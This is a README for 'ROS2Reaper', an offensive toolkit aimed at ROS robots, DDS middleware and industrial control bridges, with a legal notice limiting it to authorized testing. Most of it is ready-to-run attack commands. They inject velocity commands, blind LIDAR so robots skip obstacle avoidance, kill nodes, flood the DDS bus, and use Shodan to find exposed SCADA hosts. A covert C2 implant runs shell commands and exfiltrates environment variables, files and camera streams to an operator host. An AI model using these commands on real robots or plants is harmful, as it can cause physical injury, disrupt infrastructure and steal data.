# ROS2Reaper

```
  ██████╗  ██████╗ ███████╗██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗
  ██╔══██╗██╔═══██╗██╔════╝╚════██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ██████╔╝██║   ██║███████╗ █████╔╝██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
  ██╔══██╗██║   ██║╚════██║██╔═══╝ ██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
  ██║  ██║╚██████╔╝███████║███████╗██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
  ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
```

**DDS/RTPS + ROS 1 + ICS/OT Bridge + Post-Exploitation C2 Offensive Security Assessment Framework**

> Author: Gh057x | v0.5.0-alpha
> Targets: ROS 2 (Humble / Jazzy) · DDS (Fast DDS, Cyclone DDS, RTI Connext) · ROS 1 (Noetic / Melodic) · ICS/OT (Modbus, DNP3, OPC UA, MQTT, EtherCAT, AWS IoT)

---

## ⚠️ Legal Notice

```
╔══════════════════════════════════════════════════════════════════════╗
║  AUTHORIZED USE ONLY — MISUSE CAN CAUSE PHYSICAL HARM              ║
║  Only use on systems you own or have written authorization to test. ║
║  Robotic systems can cause injury. Ensure safety controls are in   ║
║  place before testing. Follow responsible disclosure practices.     ║
╚══════════════════════════════════════════════════════════════════════╝
```

---

## Overview

ROS2Reaper is a modular offensive security toolkit for assessing ROS 2 and ROS 1 robotic deployments. It targets the underlying DDS/RTPS transport layer — the communication backbone of ROS 2 — as well as the legacy ROS 1 rosmaster XML-RPC interface.

The framework is split into four phases covering the full attack lifecycle — from initial recon to persistent post-exploitation:

| Phase | Description |
|-------|-------------|
| **Phase 1 — Reconnaissance** | Passive/active discovery, fingerprinting, enumeration, and security auditing |
| **Phase 2 — Exploitation** | Topic injection, node impersonation, RTPS amplification, and parameter manipulation |
| **Phase 3 — ICS/OT Bridge Analysis** | Attack surface analysis for DDS bridges to Modbus, DNP3, OPC UA, MQTT, EtherCAT, and AWS IoT Greengrass |
| **Phase 4 — Post-Exploitation / C2** | Covert command-and-control channel tunneled inside DDS/RTPS traffic, persistent beaconing, and data exfiltration |

---

## Project Structure

```
ros2reaper_framework/
├── ros2reaper.py          # Main entry point / CLI
├── core/
│   ├── rtps_parser.py     # RTPS packet parser + DDS port calculator
│   ├── rtps_scanner.py    # SPDP probing, network scanning, passive listening
│   ├── ros1_master.py     # ROS1 rosmaster XML-RPC interface
│   └── ros1_transport.py  # TCPROS transport implementation
└── modules/
    ├── fingerprint.py         # DDS vendor/version/config fingerprinting
    ├── topic_enum.py          # ROS 2 topic/service/node enumeration
    ├── sros2_audit.py         # SROS2 security configuration auditing
    ├── topic_injection.py     # ROS 2 topic injection attacks
    ├── node_impersonation.py  # Node impersonation & TF poisoning
    ├── amplification.py       # RTPS amplification & robustness testing
    ├── rosbridge.py           # rosbridge WebSocket enumeration/injection/audit
    ├── ros1_enum.py           # ROS1 node/topic/param enumeration
    ├── ros1_injection.py      # ROS1 TCPROS topic injection
    ├── ros1_exploitation.py   # ROS1 node killing & parameter manipulation
    ├── ros1_audit.py          # ROS1 security configuration auditing
    ├── phase3/
    │   ├── ics_dds_enum.py        # ICS/OT context-aware DDS enumeration
    │   ├── modbus_dnp3_bridge.py  # Modbus/DNP3 ↔ DDS bridge analysis
    │   ├── mqtt_ethercat_bridge.py # MQTT/EtherCAT ↔ DDS bridge analysis
    │   ├── opcua_dds_bridge.py    # OPC UA ↔ DDS bridge analysis
    │   ├── aws_iot_bridge.py      # AWS IoT Greengrass ↔ DDS bridge analysis
    │   └── shodan_dds.py          # Internet-wide DDS exposure via Shodan
    └── phase4/
        ├── c2_channel.py          # Covert DDS/RTPS C2 transport layer
        ├── c2_server.py           # Operator C2 server + interactive shell
        ├── c2_beacon.py           # Implant deployed on compromised ROS 2 hosts
        └── c2_exfil.py            # Chunked data exfiltration over covert channel
```

---

## Installation

```bash
git clone https://github.com/r3tr0xCTF/ros2reaper_framework.git
cd ros2reaper_framework
pip install -r requirements.txt
```

> ROS 2 exploitation modules (`inject`, `impersonate`) require `rclpy` and a sourced ROS 2 environment. All Phase 1, Phase 3, and Phase 4 modules work with no ROS dependency.
>
> Phase 3 optional dependencies (all gracefully degraded if missing):
> ```bash
> pip install shodan paho-mqtt pymodbus requests asyncua
> ```
>
> Phase 4 has no additional dependencies — pure Python 3.8+ stdlib only.

---

## Usage

```
python3 ros2reaper.py <command> [options]
```

### Global Options

| Flag | Description |
|------|-------------|
| `-t`, `--target` | Target IP address |
| `-n`, `--network` | Target network in CIDR notation |
| `-d`, `--domain-id` | DDS Domain ID (default: 0) |
| `--timeout` | Probe timeout in seconds (default: 3.0) |
| `--duration` | Listen/attack duration in seconds (default: 30.0) |
| `-o`, `--output` | Save results to JSON file |
| `-v`, `--verbose` | Verbose output |
| `--skip-auth` | Skip authorization prompt (for scripting) |
| `--no-banner` | Suppress ASCII banner |

**Phase 3 options:**

| Flag | Description |
|------|-------------|
| `--threads` | Concurrent scan threads (default: 50) |
| `--deep` | Enable deep probing / protocol coexistence detection |
| `--context` | ICS sector bias: `scada`, `atc`, `automotive`, `smart_grid`, `military`, `medical`, `iiot` |
| `--passive` | Passive multicast listener mode — no probes sent (`ics-enum`) |
| `--passive-duration` | Passive listen duration in seconds (default: 30.0) |
| `--modbus-enumerate` | Enumerate Modbus unit IDs and test write access |
| `--mqtt-enumerate` | Full MQTT wildcard topic enumeration (requires `paho-mqtt`) |
| `--enum-duration` | MQTT topic listen duration in seconds (default: 10.0) |
| `--enumerate-nodes` | Browse OPC UA address space for DDS bridge indicators |
| `--shadow-enumerate` | Probe AWS IoT Shadow/Jobs topics on discovered brokers |
| `--api-key` | Shodan API key (or set env `SHODAN_API_KEY`) |
| `--limit` | Max Shodan results per query (default: 100) |
| `--rate` | Seconds between Shodan API calls (default: 1.0) |
| `--export` | Export discovered IP list from Shodan results to file |

---

## Phase 1 — Reconnaissance

### `discover` — DDS Participant Discovery

Sends SPDP (Simple Participant Discovery Protocol) probes to identify DDS participants on the network.

```bash
# Multicast probe on local network
python3 ros2reaper.py discover

# Single target
python3 ros2reaper.py discover --target 192.168.1.100

# Full network sweep
python3 ros2reaper.py discover --network 192.168.1.0/24 -o discovered.json
```

---

### `fingerprint` — DDS Vendor / Version Identification

Fingerprints discovered participants to identify DDS implementation, RMW layer, ROS 2 distro, OS hints, deployment type, and security posture.

```bash
python3 ros2reaper.py fingerprint --target 192.168.1.100
python3 ros2reaper.py fingerprint --network 192.168.1.0/24 -o fingerprints.json
```

Output includes:
- DDS vendor (Fast DDS, Cyclone DDS, RTI Connext, etc.)
- RMW implementation and ROS 2 distribution
- Node name and deployment type
- OS hint
- Security status — DDS Security / SROS2 enabled or disabled
- Risk factors with severity (CRITICAL / HIGH / MEDIUM / LOW)

---

### `portscan` — DDS Port Discovery

Scans for open DDS-specific UDP ports derived from domain IDs. Identifies discovery and user data channels per participant.

```bash
python3 ros2reaper.py portscan --target 192.168.1.100 --domains 0-10
python3 ros2reaper.py portscan --network 192.168.1.0/24 --domains 0,1,5
```

---

### `portcalc` — DDS Port Calculator

Calculates expected DDS port numbers for given domain IDs without sending any traffic.

```bash
python3 ros2reaper.py portcalc --domains 0-15
python3 ros2reaper.py portcalc --domains 0,1,42 -v
```

```
  Domain | Disc MC | Disc UC | User MC | User UC
-------------------------------------------------------
       0 |    7400 |    7410 |    7401 |    7411
       1 |    7650 |    7660 |    7651 |    7661
```

---

### `listen` — Passive RTPS Traffic Capture

Listens passively on DDS multicast groups. Zero packets sent — full stealth mode.

```bash
python3 ros2reaper.py listen --domain-id 0 --duration 60
python3 ros2reaper.py listen --domain-id 0 --duration 120 -o captured.json
```

---

### `enumerate` — ROS 2 Graph Enumeration

Enumerates the full ROS 2 compute graph: topics, services, nodes, publishers, and subscribers.

```bash
python3 ros2reaper.py enumerate --target 192.168.1.100
python3 ros2reaper.py enumerate --domain-id 5 -o graph.json
```

---

### `audit` — SROS2 Security Configuration Audit

Audits the security posture of discovered participants: checks for disabled encryption, missing access control, insecure QoS policies, and unauthenticated endpoints.

```bash
python3 ros2reaper.py audit --target 192.168.1.100
python3 ros2reaper.py audit --network 192.168.1.0/24 -o audit.json
```

---

### `full` — Complete Assessment

Runs all Phase 1 modules sequentially (discovery → fingerprinting → port scan) and produces a single consolidated JSON report.

```bash
python3 ros2reaper.py full --network 192.168.1.0/24 -o full_report.json
python3 ros2reaper.py full --target 192.168.1.100 --domain-id 0 -v
```

---

## Phase 2 — Exploitation (ROS 2)

> Requires a sourced ROS 2 environment and `rclpy`. Run from an attacker container or a ROS 2-capable host.

### `inject` — Topic Message Injection

Injects malicious messages onto ROS 2 topics across multiple attack modes.

| Mode | Description |
|------|-------------|
| `cmd_vel` | Velocity command injection — presets: `spin`, `fullspeed`, `reverse`, `erratic`, `estop`, `circle` |
| `lidar` | LIDAR scan spoofing — modes: `allclear`, `wall`, `phantom` |
| `nav` | Navigation goal hijacking — send robot to arbitrary coordinates |
| `odom` | Odometry spoofing — corrupt pose estimation pipeline |
| `swarm` | Multi-robot convergence attack — drive an entire fleet to one point |

```bash
# Spin the robot
python3 ros2reaper.py inject --namespace /robot1 --preset spin --duration 10

# Full speed injection
python3 ros2reaper.py inject --namespace /robot1 --preset fullspeed --duration 5

# Blind LIDAR — inject clear-path data to suppress obstacle avoidance
python3 ros2reaper.py inject --attack-mode lidar --namespace /robot1 --lidar-mode allclear --duration 30

# Navigation goal hijack
python3 ros2reaper.py inject --attack-mode nav --namespace /robot1 --x 10 --y 5 --duration 20

# Odometry corruption
python3 ros2reaper.py inject --attack-mode odom --namespace /robot1 --duration 15

# Swarm convergence
python3 ros2reaper.py inject --attack-mode swarm --namespaces /robot1 /robot2 /robot3 --x 5 --y 5 --duration 30
```

---

### `impersonate` — Node Impersonation

Impersonates existing ROS 2 nodes to inject data, corrupt the TF tree, flood topics, or saturate the DDS bus with fake participants.

| Mode | Description |
|------|-------------|
| `shadow` | Shadow publisher — mirror a target node's topic output with attacker-controlled data |
| `tf` | TF tree poisoning — inject corrupt coordinate frame transforms |
| `dos` | Topic flooding — saturate a node's subscriptions |
| `sybil` | Sybil attack — spawn N fake DDS participants |

```bash
# Shadow publisher
python3 ros2reaper.py impersonate --attack-mode shadow --target-node robot_controller --namespace /robot1 --duration 30

# TF poisoning
python3 ros2reaper.py impersonate --attack-mode tf --target-node fake_robot_1 --namespace /robot1 --duration 20

# Topic DoS
python3 ros2reaper.py impersonate --attack-mode dos --namespace /robot1 --duration 10

# Sybil (20 fake participants)
python3 ros2reaper.py impersonate --attack-mode sybil --namespace /robot1 --count 20 --duration 30
```

---

### `amplify` — RTPS Amplification & Robustness Testing

Tests DDS implementations for amplification vulnerabilities and protocol robustness at the raw RTPS level. No ROS 2 installation required.

| Mode | Description |
|------|-------------|
| `full_suite` | Run all robustness tests sequentially |
| `reflect` | SPDP reflection / amplification measurement |
| `exhaust` | Participant exhaustion via GUID flooding |
| `fuzz` | Malformed RTPS packet fuzzing |
| `heartbeat` | Heartbeat amplification test |

```bash
# Full suite
python3 ros2reaper.py amplify --target 192.168.1.100 --attack-mode full_suite

# Participant exhaustion
python3 ros2reaper.py amplify --target 192.168.1.100 --attack-mode exhaust --count 500

# Protocol fuzzing
python3 ros2reaper.py amplify --target 192.168.1.100 --attack-mode fuzz --domain-id 0
```

---

## ROS 1 Modules

Targets legacy ROS 1 deployments via the rosmaster XML-RPC API and TCPROS protocol.

### `ros1-discover` — Enumeration

Enumerates all nodes, topics, services, and parameters from a rosmaster.

```bash
python3 ros2reaper.py ros1-discover --target 192.168.1.10 --skip-auth
python3 ros2reaper.py ros1-discover --target 192.168.1.10 --ros1-port 11311 -v -o ros1_enum.json
```

---

### `ros1-audit` — Security Audit

Audits a ROS1 deployment for misconfigurations: unauthenticated master, security-critical topic exposure, EOL distros, and exposed parameter server.

```bash
python3 ros2reaper.py ros1-audit --target 192.168.1.10 --skip-auth -o ros1_audit.json
```

---

### `ros1-inject` — Topic Injection

Injects messages into ROS1 topics via TCPROS without being a registered node.

```bash
# cmd_vel spinout
python3 ros2reaper.py ros1-inject --target 192.168.1.10 --topic /cmd_vel --preset spinout --duration 10 --skip-auth

# LIDAR blind injection
python3 ros2reaper.py ros1-inject --target 192.168.1.10 --attack-mode lidar --topic /scan --duration 10 --skip-auth
```

---

### `ros1-exploit` — Node Kill / Parameter Manipulation

Kills ROS1 nodes and reads, writes, or deletes parameter server values.

```bash
# Kill a specific node
python3 ros2reaper.py ros1-exploit --target 192.168.1.10 --node /turtlesim --skip-auth

# Kill all nodes
python3 ros2reaper.py ros1-exploit --target 192.168.1.10 --kill-all --skip-auth

# Write a parameter
python3 ros2reaper.py ros1-exploit --target 192.168.1.10 --param-key /max_speed --param-value 0.1 --skip-auth

# Dump all parameters
python3 ros2reaper.py ros1-exploit --target 192.168.1.10 --skip-auth
```

---

## Phase 3 — ICS/OT Bridge Analysis

> No ROS installation required. All modules operate at the raw socket/TCP level.

Phase 3 targets environments where DDS/ROS 2 is bridged to industrial control system protocols. Each module discovers protocol co-existence, maps the bridge attack surface, and generates scored attack scenarios with CVSS ratings.

---

### `ics-enum` — ICS/OT Context-Aware DDS Enumeration

Classifies DDS deployments operating in non-robotics ICS/OT contexts: SCADA, air traffic control, automotive, smart grid, military, medical, and IIoT. Performs passive multicast listening or active SPDP probing with Bayesian context inference.

```bash
# Active scan — single target, SCADA context
python3 ros2reaper.py ics-enum --target 10.0.0.1 --deep --context scada --skip-auth

# Network sweep
python3 ros2reaper.py ics-enum --network 10.0.0.0/24 --deep -o ics.json --skip-auth

# Passive mode — no packets sent (stealth)
python3 ros2reaper.py ics-enum --passive --passive-duration 60 --skip-auth
```

---

### `modbus-scan` — Modbus/DNP3 ↔ DDS Bridge Analysis

Detects hosts running DDS alongside Modbus TCP (legacy SCADA) or DNP3 (power grid protocols). Maps bridge attack surface with scored scenarios including coil/register write injection, historian poisoning, and alarm suppression (max CVSS 9.8).

```bash
python3 ros2reaper.py modbus-scan --target 10.0.0.1 --deep --modbus-enumerate --skip-auth
python3 ros2reaper.py modbus-scan --network 10.0.0.0/24 -o modbus.json --skip-auth
```

---

### `mqtt-scan` — MQTT/EtherCAT ↔ DDS Bridge Analysis

Detects DDS alongside MQTT (IIoT edge-cloud) or EtherCAT (real-time fieldbus). Enumerates MQTT topics via wildcard subscription, parses Sparkplug B payloads, detects known bridge products (RTI, Zenoh, EMQX, Azure IoT Edge), and maps PDO data poisoning and topic injection scenarios (max CVSS 9.8).

```bash
python3 ros2reaper.py mqtt-scan --target 10.0.0.1 --deep --mqtt-enumerate --skip-auth
python3 ros2reaper.py mqtt-scan --network 10.0.0.0/24 -o mqtt.json --skip-auth
```

---

### `opcua-scan` — OPC UA ↔ DDS Bridge Analysis

Detects hosts with both DDS and OPC UA (the dominant ICS data exchange standard). Probes OPC UA endpoints via raw TCP HEL/ACK, enumerates security modes, identifies vendor namespaces (Kepware, OSIsoft PI, Ignition, WinCC, FactoryTalk, etc.), and scores bridge attack scenarios including setpoint injection, alarm suppression, and historian poisoning (max CVSS 9.1).

```bash
python3 ros2reaper.py opcua-scan --target 10.0.0.1 --deep --enumerate-nodes --skip-auth
python3 ros2reaper.py opcua-scan --network 10.0.0.0/24 -o opcua.json --skip-auth
```

---

### `aws-scan` — AWS IoT Greengrass ↔ DDS Bridge Analysis

Detects AWS IoT Greengrass v2 co-located with DDS. Fingerprints Greengrass via DDS participant properties, IPC socket paths, and X.509 Thing ARN exfiltration in SPDP discovery traffic. Maps pivot paths from DDS to AWS cloud via IAM role abuse, Shadow manipulation, and OTA command injection (max CVSS 10.0).

```bash
python3 ros2reaper.py aws-scan --target 10.0.0.1 --deep --shadow-enumerate --skip-auth
python3 ros2reaper.py aws-scan --network 10.0.0.0/24 -o aws.json --skip-auth
```

---

### `shodan-dds` — Internet-Wide DDS Exposure via Shodan

Queries the Shodan API for internet-exposed DDS/RTPS endpoints. Classifies results by ICS sector, DDS vendor, security posture, and domain ID. Exports target IP lists for direct feeding into `ics-enum` and other Phase 3 modules.

```bash
# Full search campaign
python3 ros2reaper.py shodan-dds --api-key YOUR_KEY --context scada -o shodan.json --skip-auth

# Single host deep lookup
python3 ros2reaper.py shodan-dds --api-key YOUR_KEY --target 1.2.3.4 --skip-auth

# Export IP list for ics-enum pipeline
python3 ros2reaper.py shodan-dds --api-key YOUR_KEY --export targets.txt --skip-auth
```

> Set `SHODAN_API_KEY` in your environment to avoid passing `--api-key` on every command.

---

### Phase 3 Pipeline

Full ICS/OT assessment workflow:

```bash
# 1. Internet recon — find exposed DDS endpoints
python3 ros2reaper.py shodan-dds --api-key $SHODAN_API_KEY --export targets.txt --skip-auth

# 2. ICS context classification
python3 ros2reaper.py ics-enum --network 10.0.0.0/24 --deep -o ics.json --skip-auth

# 3. Protocol bridge enumeration (run in parallel)
python3 ros2reaper.py modbus-scan --network 10.0.0.0/24 --deep -o modbus.json --skip-auth
python3 ros2reaper.py mqtt-scan   --network 10.0.0.0/24 --deep -o mqtt.json   --skip-auth
python3 ros2reaper.py opcua-scan  --network 10.0.0.0/24 --deep -o opcua.json  --skip-auth
python3 ros2reaper.py aws-scan    --network 10.0.0.0/24 --deep -o aws.json    --skip-auth
```

---

---

## Phase 4 — Post-Exploitation / C2

> No ROS 2 installation required on the operator side. All modules operate at raw UDP/RTPS level. The beacon side requires Python 3.8+ on the compromised host.

Phase 4 implements a covert command-and-control channel tunneled inside legitimate DDS/RTPS traffic. C2 packets are XOR-encoded and embedded in standard RTPS DATA submessages that mimic normal ROS 2 infrastructure topics (`/rosout`, `/diagnostics`, `/parameter_events`). The channel is invisible to network monitors that don't perform deep RTPS inspection.

**Architecture:**

```
Operator Machine                     Compromised ROS 2 Host
┌─────────────┐   covert DDS/RTPS   ┌──────────────────────┐
│  c2-server  │ ◄──────────────────► │     c2-beacon        │
│ (operator   │     disguised as     │  (implant, checks in │
│   shell)    │   /rosout traffic    │   every N seconds)   │
└─────────────┘                      └──────────────────────┘
```

**Covert channel design:**
- Payloads XOR-encoded and wrapped in valid RTPS DATA submessages
- GUID prefix rotated per session — no persistent fingerprint
- Beacon interval jittered ±25% to defeat timing analysis
- Masquerades as eProsima Fast DDS (most common ROS 2 middleware)

---

### `c2-server` — Operator C2 Server

Listens for beacon check-ins, tracks active sessions, and provides an interactive shell for tasking.

```bash
# Start C2 server on domain 0
python3 ros2reaper.py c2-server --domain-id 0 --skip-auth

# With custom key and session export on exit
python3 ros2reaper.py c2-server --domain-id 0 --c2-key mysecretkey -o c2_report.json --skip-auth
```

**Interactive shell commands:**

```
sessions                      List all active sessions
use <session_id>              Set active session (partial ID match)
info                          Show active session details
results                       Show task results for active session

task shell <cmd>              Run shell command on compromised host
task sysinfo                  Collect hostname, OS, ROS env info
task ros_enum                 Enumerate ROS 2 nodes/topics/params
task topic_read <topic>       Read messages from a ROS topic

kill                          Send KILL signal — terminate the beacon
export <file.json>            Export all sessions and results to JSON
exit                          Stop server
```

---

### `c2-beacon` — Implant / Beacon

Deployed on a compromised ROS 2 host after initial access. Checks in with the C2 server at a jittered interval, delivers task results, and receives new tasking.

```bash
# Basic beacon — check in every 30s
python3 ros2reaper.py c2-beacon --target <c2_server_ip> --skip-auth

# Custom interval + TTL (self-terminate after 20 check-ins)
python3 ros2reaper.py c2-beacon --target <c2_server_ip> --c2-interval 20 --c2-ttl 20 --skip-auth

# Custom encryption key (must match server)
python3 ros2reaper.py c2-beacon --target <c2_server_ip> --c2-key mysecretkey --skip-auth
```

Supported tasks (delivered from `c2-server`):

| Task | Description |
|------|-------------|
| `shell` | Execute arbitrary shell command, return stdout/stderr |
| `sysinfo` | Collect hostname, user, PID, ROS distro, domain ID |
| `ros_enum` | Enumerate ROS 2 nodes, topics, and parameters via CLI |
| `topic_read` | Read messages from a specified ROS 2 topic |

---

### `c2-exfil` — Data Exfiltration

Collects data on the compromised host and streams it to the C2 server via chunked EXFIL packets over the covert channel. Large payloads are automatically split into 1400-byte chunks (stays within UDP MTU) and reassembled on the operator side.

```bash
# Exfiltrate environment variables
python3 ros2reaper.py c2-exfil --target <c2_server_ip> --exfil-mode env --skip-auth

# Exfiltrate a file from the target filesystem
python3 ros2reaper.py c2-exfil --target <c2_server_ip> --exfil-mode files --exfil-path /etc/hosts --skip-auth

# Dump all ROS 2 parameter values
python3 ros2reaper.py c2-exfil --target <c2_server_ip> --exfil-mode params --skip-auth

# Capture and exfiltrate a ROS topic stream
python3 ros2reaper.py c2-exfil --target <c2_server_ip> --exfil-mode topic --topic /camera/image_raw --skip-auth
```

Exfil modes:

| Mode | Description |
|------|-------------|
| `env` | All environment variables and ROS configuration |
| `files` | Read a file from the target filesystem (up to 64KB) |
| `params` | Dump all ROS 2 parameter values across all nodes |
| `topic` | Capture and stream a ROS 2 topic for 10 seconds |

---

### `c2-recv` — Exfil Receiver

Listens on the operator side and reassembles chunked exfil data from a specific session.

```bash
# Receive exfil and print to stdout
python3 ros2reaper.py c2-recv --c2-session <session_id> --skip-auth

# Save to file
python3 ros2reaper.py c2-recv --c2-session <session_id> -o stolen_data.bin --skip-auth

# Longer timeout for large payloads
python3 ros2reaper.py c2-recv --c2-session <session_id> --timeout 120 -o output.txt --skip-auth
```

---

### Phase 4 Attack Workflow

Full post-exploitation flow following a successful Phase 2 compromise:

```bash
# 1. Start C2 server on operator machine
python3 ros2reaper.py c2-server --domain-id 0 --c2-key opskey -o session_log.json --skip-auth

# 2. Deploy beacon on compromised ROS 2 host (runs on the target)
python3 ros2reaper.py c2-beacon --target <operator_ip> --c2-key opskey --c2-interval 15 --skip-auth

# 3. In the c2-server shell:
#    sessions                         ← see the new session appear
#    use <session_id>
#    task sysinfo                     ← fingerprint the host
#    task ros_enum                    ← map the ROS graph
#    task shell ros2 topic list       ← arbitrary command execution
#    task topic_read /cmd_vel         ← intercept velocity commands

# 4. Exfiltrate from the compromised host
python3 ros2reaper.py c2-exfil --target <operator_ip> --c2-key opskey --exfil-mode params --skip-auth

# 5. Receive on operator side
python3 ros2reaper.py c2-recv --c2-session <session_id> --c2-key opskey -o ros_params.txt --skip-auth
```

---

## Output

All commands support `-o <file.json>` for structured JSON output. The `full` command auto-generates a timestamped report when no output path is specified.

```bash
python3 ros2reaper.py full --network 10.0.0.0/24 -o report_$(date +%s).json
```

---

## License

MIT — Use responsibly. Only test systems you own or have explicit written authorization to assess.
